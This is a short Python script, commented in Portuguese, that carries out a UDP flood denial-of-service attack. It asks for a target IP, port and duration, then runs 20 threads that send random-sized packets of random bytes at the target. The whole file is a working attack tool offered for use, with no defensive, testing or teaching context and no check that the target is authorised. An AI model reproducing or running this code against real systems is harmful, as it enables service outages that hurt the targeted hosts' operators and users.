import socket
import random
import threading
import time

# Função para o ataque
def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time() + duration
    
    print(f"Iniciando ataque DDoS em {target_ip}:{target_port} por {duration} segundos...")

    while time.time() < timeout:
        # Pacotes aleatórios de tamanho variado
        packet_size = random.randint(64, 2048)  # Tamanho de 64 a 2048 bytes
        bytes_to_send = random._urandom(packet_size)
        client.sendto(bytes_to_send, (target_ip, target_port))

    print("Ataque finalizado.")

# Parâmetros do ataque
target_ip = input("Digite o IP de destino: ")
target_port = int(input("Digite a porta de destino: "))
duration = int(input("Digite a duração do ataque em segundos: "))

# Usando múltiplas threads para aumentar a intensidade
threads = []
for i in range(20):  # Aumentar o número de threads
    t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
    t.start()
    threads.append(t)

# Aguardar todas as threads finalizarem
for t in threads:
    t.join()

print("Ataque DDoS UDP Flood concluído.")
